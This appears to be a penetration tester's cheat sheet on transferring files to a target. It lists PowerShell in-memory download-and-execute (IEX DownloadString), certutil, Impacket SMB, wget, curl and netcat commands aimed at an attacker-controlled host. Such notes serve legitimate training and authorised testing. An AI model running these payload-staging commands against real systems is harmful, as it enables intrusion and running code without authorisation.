# AI - File Transfers

## ⚡ Transfer Checklist
- [ ] **PowerShell (Memory)** -> [[#PowerShell DownloadString (Memory)]]
- [ ] **PowerShell (Disk)** -> [[#PowerShell DownloadFile (Disk)]]
- [ ] **Certutil (Windows)** -> [[#Certutil]]
- [ ] **SMB (Impacket)** -> [[#SMB (Impacket)]]
- [ ] **Linux (Wget/Curl)** -> [[#Linux]]

---

## Windows

### PowerShell DownloadString (Memory)
*Execute a script directly in memory without hitting disk.*
```blade-bash tab="ops" pane="one"
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://$ip/script.ps1')"
```

### PowerShell DownloadFile (Disk)
*Download a file to the current directory.*
```blade-bash tab="ops" pane="one"
powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://$ip/file.exe', 'C:\\Windows\\Temp\\file.exe')"
```

### Certutil
*Use for downloading executables/DLLs.*
```blade-bash tab="ops" pane="one"
certutil -urlcache -split -f http://$ip/file.exe C:\\Windows\\Temp\\file.exe
```

### SMB (Impacket)
*1. Start SMB Server on Kali*
```blade-bash tab="ops" pane="one"
sudo impacket-smbserver share . -smb2support
```

*2. Copy on Windows*
```blade-bash tab="ops" pane="one"
copy \\$ip\share\file.exe C:\\Windows\\Temp\\file.exe
```

---

## Linux

### Wget
```blade-bash tab="ops" pane="one"
wget http://$ip/file -O /tmp/file
```

### Curl
```blade-bash tab="ops" pane="one"
curl http://$ip/file -o /tmp/file
```

### Netcat
*Receiver (Target)*
```blade-bash tab="ops" pane="one"
nc -lp 4444 > file
```
*Sender (Attacker)*
```blade-bash tab="ops" pane="one"
nc -w 3 $target_ip 4444 < file
```